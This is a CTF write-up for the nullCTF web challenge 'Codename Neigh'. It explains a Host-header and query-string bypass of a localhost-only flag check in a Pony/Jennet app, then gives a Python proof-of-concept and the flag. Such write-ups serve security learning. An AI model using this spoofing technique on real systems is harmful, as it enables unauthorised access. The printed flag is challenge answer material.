#import "../../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "Codename Neigh",
    description: "Exploit writeup for 'Codename Neigh', a web challenge from nullCTF",
    date: "2025-12-09",
    order: 16,
  ),
)<frontmatter>
= Codename Neigh Exploit Analysis
Download Challenge Files(soon)

== Vulnerability Analysis

The "Codename Neigh" application is vulnerable to a Server-Side Request Forgery (SSRF) attack. This vulnerability exists in the `/flag` endpoint, which is intended to only serve the flag under specific internal conditions.

=== 1. Flag Endpoint Logic

The `/app/main.pony` file contains the `F` class, which handles requests to the `/flag` endpoint:

```pony
class F is RequestHandler
  let _fileauth: FileAuth

  new val create(fileauth: FileAuth) =>
    _fileauth = fileauth

  fun apply(ctx: Context): Context iso^ =>
    var conn: String = ""
    var body = "[REDACTED]".array()

    try
      conn = ctx.request.header("Host") as String
    end

    let path: String = ctx.request.uri().string()

    if (conn == "127.0.0.1") and (path != "/flag") and (path != "flag") then
      let fpath = FilePath(_fileauth, "public/flag.html")
      with file = File(fpath) do
        body = file.read_string(file.size()).string().array()
      end
    end

    ctx.respond(
      StatusResponse(StatusOK, [("Content-Length", body.size().string())]),
      body
    )
    consume ctx
```
The critical `if` condition checks two things:
*   `conn == "127.0.0.1"`: The `Host` header of the request must be `127.0.0.1`.
*   `(path != "/flag") and (path != "flag")`: The request URI path must *not* be exactly `/flag` or `flag`.

If both conditions are met, the content of `public/flag.html` is returned.

=== 2. Path Handling in Jennet

The `ctx.request.uri().string()` method in the Jennet framework returns the full URI, including any query parameters. This is crucial for bypassing the path check.

== The Exploitation Strategy

The exploit leverages the combination of the `Host` header check and the specific path exclusion logic.

=== Step 1: Crafting the Request

To satisfy the conditions in the `F` class, we need to:
1. Set the `Host` header to `127.0.0.1`. This tricks the application into believing the request originates from localhost.
2. Request the `/flag` endpoint, but append a query string (e.g., `?a=b`). This makes the `path` variable (which includes the query string) evaluate to something like `/flag?a=b`.

When `path` is `/flag?a=b`, the condition `(path != "/flag")` becomes true, thus bypassing the intended restriction.

=== Step 2: Sending the Malicious Request

By sending a GET request to `http://localhost:8081/flag?a=b` with the `Host` header set to `127.0.0.1`, the server will evaluate the `if` condition as true and return the contents of `public/flag.html`.

== Full Exploit Code (poc.py)

```python
import requests

# The target URL for the flag endpoint with a query string
url = "http://public.ctf.r0devnull.team:3002/flag?a=b"

# The Host header must be set to 127.0.0.1 to satisfy the server-side check
headers = {
    "Host": "127.0.0.1"
}

print(f"[*] Attempting to retrieve flag from: {url}")
print(f"[*] Using Host header: {headers['Host']}")

try:
    response = requests.get(url, headers=headers)
    response.raise_for_status() # Raise an exception for HTTP errors (4xx or 5xx)

    print("[+] Successfully received response:")
    print(response.text)

except requests.exceptions.RequestException as e:
    print(f"[-] An error occurred: {e}")
    if e.response:
        print(f"[-] Server response status: {e.response.status_code}")
        print(f"[-] Server response body: {e.response.text}")

```

To run the exploit:
1. Ensure the "Codename Neigh" application is running (e.g., via `docker-compose up -d`).
2. Save the code above as `poc.py`.
3. Execute the script: `python3 poc.py`

= Flag
```
nullctf{p3rh4ps_my_p0ny_!s_s0mewh3re_3lse_:(}
```
